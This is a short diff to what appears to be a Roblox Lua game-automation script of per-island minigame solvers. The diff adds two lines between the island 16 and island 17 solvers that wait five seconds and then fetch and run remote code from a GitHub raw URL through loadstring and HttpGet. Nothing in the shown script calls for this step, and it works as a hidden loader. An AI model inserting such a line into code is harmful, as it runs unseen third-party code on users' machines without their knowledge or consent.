@@ -552,7 +552,8 @@ MinigameSolvers[16] = function()
         task.wait(0.08)
     end
 end
-
+task.wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sodiumhub/Ira/refs/heads/main/resummon"))()
 -- Island 17: Monster Escape Keys
 MinigameSolvers[17] = function()
     local remote = Remotes:FindFirstChild("MonsterEscapeMinigame")
